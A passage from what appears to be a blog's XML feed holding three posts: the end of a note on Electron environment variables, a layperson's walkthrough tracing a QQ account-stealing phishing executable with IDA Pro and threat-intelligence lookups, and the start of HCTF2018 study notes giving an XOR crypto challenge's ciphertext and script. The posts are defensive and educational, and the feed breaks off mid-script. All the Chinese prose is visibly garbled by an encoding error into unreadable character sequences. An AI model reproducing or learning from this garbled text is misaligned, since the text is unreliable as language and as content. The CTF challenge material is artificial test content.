punctuation">;</span></code></pre><p>Êõ¥Â§öÁöÑÂëΩ‰ª§ÂèÇÊï∞ÂèØÂèÇËÄÉÔºö<a href="https://www.w3cschool.cn/electronmanual/82vz1ql9.html" target="_blank" rel="noopener">Electron‰∏≠ÊñáÊñáÊ°£</a></p><h2 id="Electron-ÁéØÂ¢ÉÂèòÈáè"><a href="#Electron-ÁéØÂ¢ÉÂèòÈáè" class="headerlink" title="Electron ÁéØÂ¢ÉÂèòÈáè"></a>Electron ÁéØÂ¢ÉÂèòÈáè</h2><p>‰∏Ä‰∫õ Electron ÁöÑË°å‰∏∫ÂèóÂà∞ÁéØÂ¢ÉÂèòÈáèÁöÑÊéßÂà∂ÔºåÂõ†‰∏∫‰ªñ‰ª¨ÁöÑÂàùÂßãÂåñÊØîÂëΩ‰ª§Ë°åÂíåÂ∫îÁî®‰ª£Á†ÅÊõ¥Êó©„ÄÇ‰ª•‰∏ã ÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÁéØÂ¢ÉÂèòÈáèÂêç</p><pre class=" language-bash"><code class="language-bash">//<span class="token operator">></span>set ELECTRON_ENABLE_LOGGING<span class="token operator">=</span>true//<span class="token operator">></span>electronELECTRON_RUN_AS_NODEELECTRON_ENABLE_LOGGINGELECTRON_LOG_ASAR_READSELECTRON_ENABLE_STACK_DUMPINGELECTRON_DEFAULT_ERROR_MODEELECTRON_NO_ATTACH_CONSOLEELECTRON_FORCE_WINDOW_MENU_BARELECTRON_HIDE_INTERNAL_MODULES</code></pre>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ËøΩË∏™Ê∫ØÊ∫ê_ÁôΩËØùÊñáËÆ≤ÁõóÂè∑--ÁßëÊôÆÁØá</title>
      <link href="/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/"/>
      <url>/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ËøΩË∏™Ê∫ØÊ∫ê-ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá"><a href="#ËøΩË∏™Ê∫ØÊ∫ê-ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá" class="headerlink" title="ËøΩË∏™Ê∫ØÊ∫ê_ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá"></a>ËøΩË∏™Ê∫ØÊ∫ê_ÁôΩËØùÊñáËÆ≤ÁõóÂè∑‚ÄìÁßëÊôÆÁØá</h1><blockquote><p>üÜí‰∏ÄÁõ¥‰∏ÄÁõ¥‰ª•Êù•ÔºåÊÄªÊòØÊúâ‰∫∫‰∏çÊñ≠Ë¢´ÁõóqqÔºåÁÑ∂ÂêéË¢´Áî®‰ª•ÊÅ∂ÊÑèÁõóÂè∑ËÄÖÊï£Êí≠Êõ¥Â§öÁöÑÊÅ∂ÊÑèÈìæÊé•ÊàñËÄÖËøõË°åËØàÈ™óÁõàÂà©Ê¥ªÂä®ÔºåÊÅ∂ÊÄßÂæ™ÁéØÔºåÊÑàÊºîÊÑàÁÉàÔºå‰∏∫‰∫ÜÁªôÂêåÂ≠¶‰ª¨Á®çÂæÆÁßëÊôÆ‰∏Ä‰∏ãÂü∫Êú¨ÁöÑÁõóÂè∑ÂéüÁêÜÔºåÊïÖÊúâÊ≠§Êñá„ÄÇ</p><p>‰ªéÊâ´‰∫åÁª¥Á†ÅÁõóÂè∑ÔºåÂà∞Ê®°ÊãüqqÁôªÂΩïÁïåÈù¢ÁöÑÈíìÈ±ºÁΩëÁ´ôÁõóÂè∑ÔºåÂÜçÂà∞‰º™ÈÄ†qqÂú®Á∫øÊñáÊ°£ËØ±ÂØºqqÁî®Êà∑ÁÇπÂáªÂØºËá¥ÁöÑÁõóÂè∑ÔºåÊÄª‰πãÁõóÂè∑ÁöÑÊñπÂºèÂêÑÁßçÂêÑÊ†∑Ôºå‰ΩÜÈÉΩÁ¶ª‰∏çÂºÄ‰∏Ä‰∏™ÈáçÁÇπÔºå<strong>ÈÇ£Â∞±ÊòØ‰Ω†ÁöÑË¥¶Âè∑ÊòØ‰ªé‰Ω†ÁöÑËÆæÂ§á‰∏äÈù¢‰º†ËæìÁªôÂà´‰∫∫ÁöÑ</strong>ÔºàÂ¶ÇÊûú‰Ω†Ê≤°ÊúâÂà∞Â§ÑÂÆ£Êâ¨‰Ω†ÁöÑÂØÜÁ†ÅÁöÑËØùüòÑÔºâÔºåÊàñÊòØËÆæÂ§áË¢´Ê§çÂÖ•Êú®È©¨ÔºåËÆ∞ÂΩïÈîÆÁõòËæìÂÖ•ÔºåÊäëÊàñÊòØ‰º™ÈÄ†È°µÈù¢‰ΩøÂæóÁî®Êà∑‰∏ªÂä®ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÁ≠âÁ≠âÁ≠âÁ≠â„ÄÇ</p><p>Êó¢ÁÑ∂Áü•ÈÅìÔºåË¥¶Âè∑ÂØÜÁ†ÅÊòØ‰ªéËá™Â∑±ÁöÑËÆæÂ§á‰∏ä‰º†Âà∞ÊÅ∂ÊÑèÁõóÂè∑ËÄÖÊâã‰∏äÁöÑÔºåÈÇ£‰πàÈóÆÈ¢òÂ∞±ÂèòÂæóÁÆÄÂçï‰∫Ü„ÄÇ</p><p>Êé•‰∏ãÊù•Â∞±‰ªé‰∏Ä‰∏™ÈÇÆ‰ª∂ÈíìÈ±ºËØ¥Ëµ∑Ôºå‰∫ãÊÉÖÊòØËøôÊ†∑Â≠êÁöÑ‚Ä¶‚Ä¶</p></blockquote><h2 id="0x00-Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂"><a href="#0x00-Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂" class="headerlink" title="0x00 Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂"></a>0x00 Êî∂Âà∞‰∏ÄÂ∞ÅÂèØÁà±ÁöÑÈÇÆ‰ª∂</h2><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120225806.png" alt=""></p><blockquote><p>ÈÇÆ‰ª∂‰∏≠ÊúâÂèØÁà±ÁöÑËêåÂ¶πÂèòÂ£∞Âô®ÔºåÊúâÁ¶èÂà©Â∞èÁîµÂΩ±ÔºåÊ∏∏ÊàèÂä†ÈÄüÂô®ÁöÑÈìæÊé•ÔºåÂèØË∞ìÊòØÂê∏Âºï‰∫∫ÊûÅ‰∫ÜÔºåÊàë‰ª¨ÂÖàÂéªËøô‰∏™ÈìæÊé•‰∏ãËΩΩ‰∏Ä‰∏™ËêåÂ¶πÂèòÂ£∞Âô®Áé©‰∏Ä‰∏ã„ÄÇ</p><p>ËøôÊòØ‰∏Ä‰∏™ÂçÅÂàÜÂÖ∏ÂûãÁöÑexeÊñá‰ª∂Ôºå‰∏ÄËà¨Á®çÂæÆÊúâ‰∫õÂü∫Á°ÄÁ¥†ÂÖªÁöÑ‰∫∫ÈÉΩ‰∏ç‰ºöÈöè‰æøÁÇπÂºÄËøôÁßçexeÊñá‰ª∂ÁöÑÂì¶„ÄÇÊØîexeÊñá‰ª∂Êõ¥ÂÆπÊòì‰∏≠ÊãõÁöÑÊòØÊñáÊ°£Êñá‰ª∂ÔºåÂ¶ÇdocÊñáÊ°£ÔºåÊÅ∂ÊÑè‰∫∫ÂëòÂèØËÉΩ‰ºöÂà©Áî®Â¶ÇofficeÁöÑÊºèÊ¥ûÔºåÂΩì‰Ω†ÁÇπÂºÄ‰ªñÁ≤æÂøÉÂà∂‰ΩúÁöÑÊñáÊ°£ÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöËß¶ÂèëÂ¶ÇÂÆèÁóÖÊØíÔºåËøúÁ®ã‰ª£Á†ÅÊâßË°åÁ≠âÈóÆÈ¢òÔºåÊ≠£‰∏≠‰∫∫‰∏ãÊÄÄ„ÄÇ</p></blockquote><p>ËôöÊãüÊú∫ÊòØ‰∏™Â•Ω‰∏úË•øÂë¢ÔºåÂ¶ÇÊûú‰Ω†Êúâ‰ªÄ‰πà‰∏úË•øÈùûË¶ÅÂÜíÁùÄÈ£éÈô©ÂéªËøêË°å‰∏Ä‰∏ãÔºåÈÇ£‰πà‰∏çÂ¶ÇË£Ö‰∏™ËôöÊãüÊú∫ÂÖàËØïËØïÊ∞¥ÔºåËøôÊ¨°ÂàÜÊûêÊàë‰ª¨Â∞±Âú®‰∏Ä‰∏™win7ÁöÑËôöÊãüÊú∫‰∏≠ËøõË°å„ÄÇ</p><h2 id="0x01-‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA-ProÔºâ-ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê"><a href="#0x01-‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA-ProÔºâ-ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê" class="headerlink" title="0x01 ‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA ProÔºâ ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê"></a>0x01 ‰ΩøÁî®Â∑•ÂÖ∑ÔºàIDA ProÔºâ ËøõË°åÁÆÄÂçïÁöÑÈùôÊÄÅÂàÜÊûê</h2><p>ÂÖ∂ÂÆûÈÉΩÊ≤°ÊÄé‰πàÂàÜÊûêÁ®ãÂ∫èÈÄªËæëÔºåÂõ†‰∏∫„ÄÇ„ÄÇ„ÄÇËøôÁ®ãÂ∫èÂ§™Á≤óÁ≥ô‰∫Ü„ÄÇ</p><p>‰∏ãËΩΩËêåÂ¶πÂèòÂ£∞Âô®.exeÂêéÔºåÂèØ‰ª•ÂÖàÁúãÁúãÊñá‰ª∂Â±ûÊÄßÂì¶Ôºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120230944.png" alt=""></p><p>Êñá‰ª∂Â§ßÂ∞è‰ªÖÊúâ707kbÔºå‰∏Ä‰∏™ÂèòÂ£∞Âô®‰Ω†ËßâÂæóÂè™ÈúÄË¶Å707kbÂ§ßÂ∞èÂêóÔºüÂæàÊòéÊòæ‰∏çÊ≠¢ÁöÑÂ•Ω‰∏çÂ•ΩÔºåÊØïÁ´üÂèòÂ£∞Âô®Ëøô‰πàÁßÄÁöÑÁé©ÊÑèÂÑøÊòØÂêß„ÄÇ</p><p>ÂÖàÁî®PC hunterÁõëÊéß‰∏Ä‰∏ãËøêË°åËØ•Êñá‰ª∂‰πãÂâçÔºåÊàë‰ª¨ÁöÑÁΩëÁªúÊÉÖÂÜµÔºàËøõÁ®ãÔºåÊúçÂä°Á≠â‰ø°ÊÅØÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120231308.png" alt=""></p><p>ÂèåÂáªËøêË°å‰∏Ä‰∏ã<code>ËêåÂ¶πÂèòÂ£∞Âô®.exe</code>Ôºåemmm‰∫ãÂÆûÊòØÂõ†‰∏∫ËôöÊãüÊú∫‰∏≠Áº∫Â∞ë‰∏Ä‰∫õÊñá‰ª∂ÂØºËá¥Êó†Ê≥ïËøêË°åÔºåÊ≠£Â∏∏ÊÉÖÂÜµ‰∏ãËøêË°å‰πãÂêéÂü∫Êú¨‰∏äÊòØÂèØ‰ª•ÁúãÂà∞‰ºöÊúâÂ§öÂá∫Êù•ÁöÑÂºÇÂ∏∏ËøõÁ®ãÔºåËÄåËøô‰∏™ËøõÁ®ã‰ºöÂØπÊüê‰∏™ipÊàñËÄÖÂüüÂêçËøõË°åËøûÊé•Ôºå‰º†ËæìÁ™ÉÂèñÁöÑ‰ø°ÊÅØÁ≠âÁ≠â„ÄÇ</p><p>ÈÇ£‰πàÊé•‰∏ãÊù•Áõ¥Êé•ÂàÜÊûêÂêßÔºåIDA ProÂèçÊ±áÁºñÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232154.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÈÄöËøáÂèçÊ±áÁºñ‰πãÂêéÔºåÁ®ãÂ∫èÂÜÖÈÉ®ÁöÑ‰∏Ä‰∫õ‰ø°ÊÅØ‰ª•Ê±áÁºñ‰ª£Á†ÅÁöÑÂΩ¢ÂºèÂ±ïÂºÄÔºå‰ΩÜÊòØÊàë‰ª¨Êó¢ÁÑ∂ÊòØ‰ª•ÁôΩËØùÊñáÁöÑÂΩ¢ÂºèÊù•ËÆ≤ËøôÁØáÁßëÊôÆÊñáÁ´†ÔºåÈÇ£ËÇØÂÆö‰∏çÊòØÂàÜÊûê‰ª£Á†ÅÂíØÔºåÂè™Ë¶ÅÊòéÁôΩËøô‰∏™ÊµÅÁ®ãÂ∞±Ë°åÂï¶„ÄÇ</p><p>Êé•‰∏ãÊù•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®IDA proÁöÑ<code>shift + f12</code>Âø´Êç∑ÈîÆÊù•ÊèêÂèñËøô‰∏™<code>ËêåÂ¶πÂèòÂ£∞Âô®.exe</code>‰∏≠ÁöÑ‰∏Ä‰∫õÂ≠óÁ¨¶‰∏≤ÔºåÊù•ÁúãÁúãÊúâÊ≤°ÊúâÂèØÁñëÁöÑÊòéÊòæÁöÑÁ∫øÁ¥¢„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232604.png" alt=""></p><p>ÂæàÁÆÄÂçïÂ∞±ÁúãÂà∞‰∫Ü‰∏Ä‰∫õÂÖ≥ÈîÆÂ≠óÁúºÔºåÂ¶Ç<code>Connection==&gt;ËøûÊé•||Pipe==&gt;ÁÆ°ÈÅì||Hostname==&gt;‰∏ªÊú∫Âêç</code>Á≠â‰ø°ÊÅØ„ÄÇÂΩìÁÑ∂ÔºåÊõ¥È´òÁ∫ß‰∏ÄÁÇπÁöÑËΩØ‰ª∂ÊàñËÄÖÈíìÈ±ºÁ®ãÂ∫è‰∏ç‰ºöÂÉèËøô‰∏™Ëøô‰πàÁ≤óÁ≥ôÔºåËá≥Â∞ë‰ºöÁªôÂÖ≥ÈîÆÂ≠óÁ¨¶‰∏≤Âä†ÂØÜÔºåÂä†Â£≥ÊàñËÄÖÂä†ÂèçË∞ÉËØïÊé™ÊñΩÔºåËøôÈÉΩÊòØÂêéËØù‰∫ÜÔºà‰º∞ËÆ°Â∞èÁôΩÂê¨‰∏çÊáÇÔºâ„ÄÇ</p><p>ÈÇ£‰πàÂÜçÁªÜÁªÜÊâæÊâæÔºåËÉΩ‰∏çËÉΩÊâæÂà∞ËØ•ÈíìÈ±ºÁ®ãÂ∫èÊï£Â∏ÉËÄÖÁöÑË∏™ËøπÂë¢Ôºü</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233000.png" class="lazyload"></p><p>Êûú‰∏çÂÖ∂ÁÑ∂ÔºåIPÂú∞ÂùÄÊãøÂà∞‰∫ÜÔºåÂéªÁúã‰∏ÄÁúºÂñèÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233142.png" class="lazyload"></p><h2 id="0x02-ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê"><a href="#0x02-ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê" class="headerlink" title="0x02 ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê"></a>0x02 ÁÆÄÂçïÂú∞ËøΩË∏™Ê∫ØÊ∫ê</h2><p>‰∏äÈù¢ÁöÑÈÇ£‰∏™urlÊòØ‰∏Ä‰∏™Áî®Êù•Êé•Êî∂Á™ÉÂèñÂà∞ÁöÑ‰ø°ÊÅØÁöÑÊé•Âè£ÔºåÈÇ£‰πàÈÄöËøáÁé∞ÊúâÁöÑ‰ø°ÊÅØÔºåÊàë‰ª¨Â¶Ç‰ΩïÊ∑±‰∏ÄÊ≠•ËøΩË∏™Ê∫ØÊ∫êÂà∞Ëøô‰ΩçÂèØÁà±ÁöÑÁ®ãÂ∫èÊï£Â∏ÉËÄÖÂë¢Ôºü</p><p>ÂΩìÁÑ∂ÊòØÂ®ÅËÉÅÊÉÖÊä•ÂàÜÊûêÂπ≥Âè∞Ëµ∞‰∏ÄÊ≥¢ÂíØÔºàÂ¶ÇVTÔºåÂæÆÊ≠•ÔºâÔºåÂÖ∂ÂÆûÊàë‰ª¨‰∏ÄÂºÄÂßãÂ∞±ÂèØ‰ª•ÊääËØ•exeÊñá‰ª∂‰∏ä‰º†Âà∞Â®ÅËÉÅÊ£ÄÊµãÂπ≥Âè∞ËøõË°åÊ£ÄÊµãÔºàÂπ≥Âè∞ÂèØ‰ª•ÂØπURLÔºåMD5ÔºåIPÁ≠âÁ≠â‰ø°ÊÅØËøõË°åÂÖ≥ËÅîÊü•ËØ¢ÔºâÔºå‰ΩÜÊòØ‰∏∫‰∫ÜÊÉÖËäÇÈúÄË¶ÅÔºåÂÖàÁªÜÁªÜÂàÜÊûê‰∏Ä‰∏ãÊñá‰ª∂ÔºåÈÇ£‰πàÊàë‰ª¨Áé∞Âú®Ë¶ÅÂÅöÁöÑÊòØÁî®Â®ÅËÉÅÊÉÖÊä•Âπ≥Âè∞Êü•ÊâæÂæóÂà∞ÁöÑIPÂÖ≥ËÅî‰ø°ÊÅØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233709.png" class="lazyload"></p><p>ÂÆûÈôÖ‰∏äÁî®ÊúÄÂºÄÂßãÈÇÆÁÆ±‰∏≠Êî∂Âà∞ÁöÑÈÇ£‰∏™ÂüüÂêç‰πü‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÁúãÂÖ≥ËÅîÁöÑÊñá‰ª∂Ê£ÄÊµã‰ø°ÊÅØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233930.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Ê£ÄÊµãÂà∞‰∫ÜÂ®ÅËÉÅÔºåÂÖ∑Êúâ‰∏ÄÂÆöÁöÑÂç±Èô©ÊÄßÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234058.png" class="lazyload"></p><p>ÂÖ∂ÂÆûÊé•‰∏ãÊù•Â∞±ÂèØ‰ª•ÂØπËØ•IPËøõË°åÊõ¥Ê∑±ÂÖ•ÁöÑ‰∫ÜËß£‰∫ÜÔºàÊîªÂáªÊòØ‰∏çÂèØËÉΩÊîªÂáªÁöÑÔºåÈ°∂Â§öÊâ´ÊèèÊâ´ÊèèÁõÆÂΩïÔºåÊâ´ÊèèÁõÆÂΩïÊàë‰πüÊòØÊ≤°ÊúâÊâ´ÁöÑÔºâÂõ†‰∏∫‰∏ãÈù¢ÂæóÂà∞ÁöÑÂá†‰∏™urlÂ∞±Â§üÊàë‰ª¨ÊâæÂà∞ÈÇ£‰∏™ÂèØÁà±ÁöÑ‰∫∫‰∫ÜÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234312.png" class="lazyload"></p><p>ËÆøÈóÆ‰∏Ä‰∏ãËøô‰∫õurlÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234500.png" class="lazyload"></p><p>ÂóØÂ∑Æ‰∏çÂ§öÂ∞±Âæó‰∫ÜÔºåÊàë‰ª¨‰πüÂ∞±‰∏çÊâìÊâ∞‰∫∫ÂÆ∂‰∫ÜÂêß„ÄÇ</p><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><blockquote><p>ÊÄª‰πãÂ∞±ÊòØÔºåÊÅ∂ÊÑèÈìæÊé•Â∞ëÁÇπÂéªÁÇπÂºÄÂï¶ÔºåÂ∞±ÁÆóÁÇπÂºÄ‰∫ÜÔºåÊ≤°ÊúâËµã‰∫àÊùÉÈôêÔºåÊàñËÄÖ‰Ω†Ê≤°Êúâ‰∏ªÂä®ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÔºåÂÜçÊàñËÄÖÊòØ‰Ω†Ê≤°ÊúâÁΩëÁªúÔºåÈÉΩÂü∫Êú¨‰∏ç‰ºöÂØºËá¥Ë¢´ÁõóÂè∑ÁöÑÂï¶„ÄÇ</p><p>ÊÅ∂ÊÑèÊñá‰ª∂Ëá™Â∑±ÈúÄË¶ÅÂ•ΩÂ•ΩÂàÜËæ®ÂíØÔºåÂ∞±‰ªé‰∏äÈù¢ÁöÑÊñπÊ≥ïÊàë‰ª¨Âü∫Êú¨‰∏äÂ∞±ÂèØ‰ª•ÈÅøÂÖçÊÅ∂ÊÑèÊñá‰ª∂‰∫ÜÔºå‰ΩÜÊòØÊÅ∂ÊÑèÊñáÊ°£ËøòÊòØÈúÄË¶ÅÊ≥®ÊÑèÔºåËôΩÁÑ∂ÊÅ∂ÊÑèÊñáÊ°£ÁöÑÈíàÂØπÊÄßÔºå‰º™ÈÄ†ÈöæÂ∫¶ÊØîËæÉÈ´òÔºå‰ΩÜÊòØ‰∏çÊéíÈô§ÊüêÂ§©‰Ω†Â∞±Ë¢´ÈíàÂØπ‰∫ÜÔºå‰Ω†ËØ¥ÊòØÂêßÔºüü§£</p></blockquote><p>Ëã•Êúâ‰∏çÁ¨¶ÔºåËøòÊúõÊñßÊ≠£„ÄÇ</p><p>Published by Yof3ng.</p>]]></content>
      
      
      <categories>
          
          <category> ‰ø°ÊÅØÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ËøΩË∏™Ê∫ØÊ∫ê </tag>
            
            <tag> ‰ø°ÊÅØÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HCTF2018_Â≠¶‰π†ËÆ∞ÂΩï</title>
      <link href="/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="HCTF2018-Â≠¶‰π†ËÆ∞ÂΩï"><a href="#HCTF2018-Â≠¶‰π†ËÆ∞ÂΩï" class="headerlink" title="HCTF2018_Â≠¶‰π†ËÆ∞ÂΩï"></a>HCTF2018_Â≠¶‰π†ËÆ∞ÂΩï</h1><blockquote><p>ÈáçÊï¥ÊóóÈºìÂÜç‰∏äË∑Øüò≠ÔºåhctfÊ≤°Â§™ÈáçËßÜ(ÂÖ∂ÂÆûÈáçËßÜ‰∫Ü‰πü‰∏ç‰ºöÂÅö)ÔºåÂè™ËÉΩËµõÂêéÁúãÁúãÂ∏àÂÇÖ‰ª¨ÁöÑwriteupÂ≠¶‰π†‰∏ÄÊ≥¢„ÄÇÊé•‰∏ãÊù•ÊâìÁÆóÂ≠¶‰∏Ä‰∏ãÂü∫Á°ÄÁöÑÂØÜÁ†ÅÂ≠¶Ôºå‰∏çÁÑ∂ËÄÅÊòØÊáµÈÄºÂèØÊ≤°Áî®Âë¢„ÄÇ</p></blockquote><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><p><a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">HCTF2018_CNSS_WP</a></p><p><a href="https://xz.aliyun.com/t/3256#toc-21" target="_blank" rel="noopener">HCTF2018_ Â§©Êû¢ _WP</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-23" target="_blank" rel="noopener">HCTF2018_Eur3kA_WP</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1-Xor-game"><a href="#crypto1-Xor-game" class="headerlink" title="crypto1 - Xor_game"></a>crypto1 - Xor_game</h3><blockquote><p>È¢òÁõÆÁªôÂá∫‰∫Ü‰∏Ä‰∏™cipher.txtË£ÖÊúâÂØÜÊñáÔºå‰ª•Âèä‰∏Ä‰∏™Âä†ÂØÜËÑöÊú¨ÔºåÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><p>cipher.txt:</p><pre class=" language-python"><code class="language-python">ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLVAQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTSVQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkkaHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABHVS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbPhsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHBpHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA95Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAARGxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TLEkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAsXMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREaDB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWFQ0XLRocMgxkNgoAABd<span class="token operator">+</span>PRkIKwkDEAoTLQ1TKwELVAgHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDNQci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAdGUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJRmBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNgUCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdDBpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzYCDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0dKg0fJkk<span class="token operator">/</span>HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuAShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5EwYYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRsCDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsccgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTAU4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKwEWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRIYBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYBPBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdEh1<span class="token operator">+</span>OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFht4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEUGDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9UEAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBGkUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAATRLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkkDHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMIVyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSNgdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgIWfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgRSQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGfx4bPh1OHAQB</code></pre><p>challenge.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#challenge.py</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span>poem <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'poem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token 